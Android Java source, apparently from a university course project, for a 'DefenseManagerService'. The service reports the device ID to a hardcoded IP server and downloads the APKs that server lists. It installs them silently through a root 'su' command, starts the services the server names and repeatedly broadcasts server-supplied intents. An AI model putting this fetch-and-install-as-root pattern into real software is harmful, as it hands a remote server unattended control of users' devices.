package edu.bu.ec700.john.mainapp;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.StrictMode;
import android.telephony.TelephonyManager;
import android.util.Log;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.StatusLine;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

/**
 * Created by John on 4/2/15.
 */
public class DefenseManagerService extends Service {

    static final String TAG = "MainApp";  // debug tag
    private static Timer timer = new Timer();
    List<Intent> intents = new ArrayList<>();

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.v(TAG, "start called");
        startService();
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        // We don't provide binding, so return null
        return null;
    }

    private String getDeviceID() {
        TelephonyManager tm = (TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getDeviceId();
    }

    private void startService()
    {
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();

        StrictMode.setThreadPolicy(policy);
        String response = getJSON("http://54.69.143.73:1337/listing/?deviceid=" + getDeviceID());
        try {
            JSONObject respobj = new JSONObject(response);
            JSONArray apks = respobj.getJSONArray("apks");
            Log.v(TAG, "num apks: " + new Integer(apks.length()).toString());

            for (int i=0; i<apks.length(); i++) {
                JSONObject apkinfo = apks.getJSONObject(i);

                Log.v(TAG, apkinfo.getString("apkname"));
                Log.v(TAG, apkinfo.getString("servicetostart"));
                Intent intent = new Intent(this, DownloadService.class);
                intent.putExtra("url", "http://54.69.143.73/apks/" + apkinfo.getString("apkname"));
                intent.putExtra("apkname", apkinfo.getString("apkname"));
                intent.putExtra("servicetostart", apkinfo.getString("servicetostart"));
                intent.putExtra("config", apkinfo.getJSONArray("config").toString());
                intent.putExtra("receiver", new DownloadReceiver(new Handler(), this));
                startService(intent);

            }
        } catch (Exception e) {
            Log.v(TAG, "error:"+e.toString()+e.getCause());
            return;
        }
        timer.scheduleAtFixedRate(new mainTask(), 0, 5000);
    }

    private class mainTask extends TimerTask
    {
        public void run()
        {
            for (Intent i : intents) {
                sendBroadcast(i);
            }
        }
    }

    // Cited: https://dylansegna.wordpress.com/2013/09/19/using-http-requests-to-get-json-objects-in-android/
    public String getJSON(String address){
        StringBuilder builder = new StringBuilder();
        HttpClient client = new DefaultHttpClient();
        HttpGet httpGet = new HttpGet(address);
        try{
            HttpResponse response = client.execute(httpGet);
            StatusLine statusLine = response.getStatusLine();
            int statusCode = statusLine.getStatusCode();
            if(statusCode == 200){
                HttpEntity entity = response.getEntity();
                InputStream content = entity.getContent();
                BufferedReader reader = new BufferedReader(new InputStreamReader(content));
                String line;
                while((line = reader.readLine()) != null){
                    builder.append(line);
                }
            } else {
                Log.e(TAG,"not a valid response");
            }
        }catch(ClientProtocolException e){
            Log.e(TAG, "protocol error");
        } catch (IOException e){
            Log.e(TAG, "io error");
        }
        return builder.toString();
    }

    public void downloadDone(String apkname, String servicetostart, String config) {
        Log.v(TAG, "DOWNLOAD DONE, installing:" + apkname);
        try {
            Process su = Runtime.getRuntime().exec("/system/xbin/su2 pm install -r /sdcard/" + apkname);
            su.waitFor();
            su = Runtime.getRuntime().exec("/system/xbin/su2 am startservice -n " + servicetostart);
            su.waitFor();
            JSONArray c = new JSONArray(config);
            processConfigIntents(c);
            Log.v(TAG, c.toString());
        } catch (Exception e) {
            Log.v(TAG, e.toString());
        }
    }

    private void processConfigIntents(JSONArray c) {
        for (int i=0; i<c.length(); i++) {
            try {
                JSONObject cmd = c.getJSONObject(i);
                String action = cmd.getString("action");
                JSONObject extras = cmd.getJSONObject("extras");
                Intent intent = new Intent();
                Iterator<String> keys = extras.keys();
                Log.v(TAG, "action:" + action);
                while( keys.hasNext() ) {
                    String key = (String)keys.next();
                    if ( extras.get(key) instanceof String ) {
                        intent.putExtra(key, (String) extras.get(key));
                        Log.v(TAG, "putting str extra:" + key + ", " + (String) extras.get(key));
                    } else if (extras.get(key) instanceof Integer) {
                        intent.putExtra(key, (Integer) extras.get(key));
                        Log.v(TAG, "putting int extra:" + key + ", " + extras.get(key).toString());
                    }
                }
                boolean resend = cmd.getBoolean("resend");
                Log.v(TAG, "Sending intent:" + intent.toString());
                if (resend) {
                    Log.v(TAG, "(will resend)");
                    intents.add(intent);
                }
                sendBroadcast(intent);
            } catch (Exception e) {
                Log.v(TAG, "cmd exception:" + e.toString());
            }
        }
    }

}
